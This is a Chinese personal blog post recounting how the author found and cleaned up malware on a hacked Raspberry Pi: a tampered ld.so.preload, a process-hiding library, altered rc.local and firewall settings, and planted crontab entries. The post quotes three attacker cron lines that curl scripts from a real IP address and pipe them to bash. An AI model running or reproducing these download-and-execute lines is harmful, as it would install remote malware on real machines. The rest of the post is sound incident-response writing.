---
title: 记一次树莓派被黑后紧急恢复系统和应用的经历
date: 2020-11-28 22:22:22
img: "/images/RaspberryPi 4B.jpg"
cover: fasle
coverImg: "/images/RaspberryPi 4B.jpg"
toc: false
mathjax: false
categories: 触类旁通
tags:
  - 树莓派
  - 恢复
keywords: 树莓派
summary: 今天突然发现家里树莓派都访问不了，内网穿透全挂了，回家后发现应用也都停了，后来发现是中毒了，好在只有一台树莓派被黑，真是吓尿了...
---

## 记一次树莓派被黑后紧急恢复系统和应用的经历

当时的情况是在外面发现我的博客和其他应用都打不开了

然后连 ssh 想看下怎么回事， 发现 ssh 也连不上了，每一台树莓派都连不上了，应该是内网穿透(`frp`)挂了

到家后 ssh 登录内网穿透所在机器，发现到处都在提示 `.../etc/ld.so.preload cannot be preloaded...`

ssh 登录时提示, 使用 docker 命令时等等, 并且 docker 命令全都无法使用, 试了下其他机器，还好其他机器正常

不仅内网穿透挂了，docker 也挂了，开机启动项也都没了

赶紧查查这个提示是啥玩意...

## 在病毒迫害下挣扎

查资料说把 `ld.so.preload` 清空就行了 

```shell
echo "" > /etc/ld.so.preload
reboot
```

清空后重启，还真有效，正常了，重新设置一下内网穿透和开机启动配置

```shell
vim frp/frpc_baozi.ini
vim /etc/rc.local
```

`:wq` 告诉我 `rc.local` 保存失败?! 发现状态是新文件, 从另一个树莓派上传过来 一下试试

```jshell
scp root@192.168.6.130:/etc/rc.local /etc/rc.local
```

我去，又提示文件或文件夹不存在, 进入目录查看，却又发现文件存在...好吧，进去看看啥情况

```shell
cd /etc
ls
```

发现开机启动配置文件 `rc.local` 在啊！

再次编辑 `rc.local` 文件仍然提示是新文件？！

查看文件信息啥情况...

```shell
ls -l rc.l*
```

发现这玩意是个链接, 链接到的 `/etc/rc.d/rc.local`...！ **就在此时系统又出问题了**...再次清空重启(`echo "" > /etc/ld.so.preload && reboot`)后正常

查看另一个树莓派中 `/etc/ld.so.preload` 是有内容的，编辑文件与另一个树莓派的值一样后重启

```shell
vim /etc/ld.so.preload
reboot
```

再次设置内网穿透和启动项，没配完**又跪了**...

再再再次清空和重启(`echo "" > /etc/ld.so.preload && reboot`), 感觉是被黑了，查看最近历史命令 `history 1000`, 没发现什么异常, 好吧没啥头绪

但是既然刚才发现这个是连接，干脆删了，从另一个树莓派再穿一次过来试试, 看看可不可以

```shell
rm -rf rc.local
scp root@192.168.6.130:/etc/rc.local /etc/rc.local
cat /etc/rc.local
```
这次查看文件内容正常, 紧接着**叕开始报错了！！！** 清空，重启！

此时我敢肯定是被种木马了...

## 反击

赶紧趁现在还能偶尔正常操作会儿，备份下 docker 镜像

```shell
docker login
docker push crazybun/arm-jenkins-jdk8
docker push crazybun/arm-oracle-jdk
docker push crazybun/maven
```

又不正常了，报错的时候 docker 也会跪, 发现 `rc.local` 又变了, **有东西`一直`在改我系统文件**

查了下可以用 `chattr` 给文件或文件夹加锁/解锁

清空，这回给 `/etc` 目录加锁后重启

```shell
echo "" > /etc/ld.so.preload
chattr +i /etc
reboot
```

这总是一会儿就跪，有定时任务吧，查看定时任务看看有没有什么猫腻

```shell
crontab -l
# 多了这么三行
*/30 * * * * curl -A fczyo-cron/1.5 -sL http://34.92.166.158:8080/files/xanthe | bash -s >/dev/null 2>&1
*/30 * * * * curl -A fczyo-cron/1.5 -sL http://34.92.166.158:8080/files/xesa.txt | bash -s >/dev/null 2>&1
*/30 * * * * curl -A fczyo-cron/1.5 -sL http://34.92.166.158:8080/files/fczyo | bash -s >/dev/null 2>&1
```

卧槽还真有东西！在 windows 打开一个连接立刻就报病毒了！

立刻编辑定时任务删掉这些不是我添加的定时任务，重启

```shell
crontab -e
reboot
```

检查防火墙状态...结果是空的，之前的配置都没了，貌似所有端口都允许访问了, 防火墙被关了...

```shell
# 查看防火墙状态
sudo ufw status
# 开启防火墙
sudo ufw enable
# 默认全部拒绝
sudo ufw default deny
# 添加自己允许访问的端口
sudo ufw allow ...
# 检查状态
sudo ufw status
```

给定时任务目录也加锁

```shell
chattr +i /var/spool/cron/
```

查看 `lib` 是否有多余的包, 对比另一个树莓派，还真有一个 `libprocesshider.so`

```shell
cd /usr/local/lib
ls -l
```

查看修改创建时间，就昨天创建的。。。赶紧删掉！

```shell
stat libprocesshider.so
rm -f libprocesshider.so
```

暂时是想不到其他东西了，但还是很害怕，好在这个树莓派里只有几个应用，数据库不在这里...

还是备份好应用后重装系统保险些，暂时先恢复应用跑起来吧，好歹也写了个简易自动交(kui)易(qian)程序呢，应用停了感觉亏(zhuan)了一个亿！

## 恢复

回头继续配置内网穿透

对比另一个树莓派中 `rc.local` 链接的目标是不存在的，解锁，删除！从另一个树莓派中再拷贝过来，修改配置，加锁重启一气呵成

```shell
chattr -i /etc
rm -rf /etc/rc.d/rc.local
rm -rf rc.local
scp root@192.168.6.130:/etc/rc.local ./rc.local
vim /etc/rc.local
chattr +i /etc
reboot
```

内网穿透开机自启终于正常工作了，应用也稳定跑起来了

终于告一段落，有时间重装下系统最稳，不知道还有啥东西被改了呢。。。
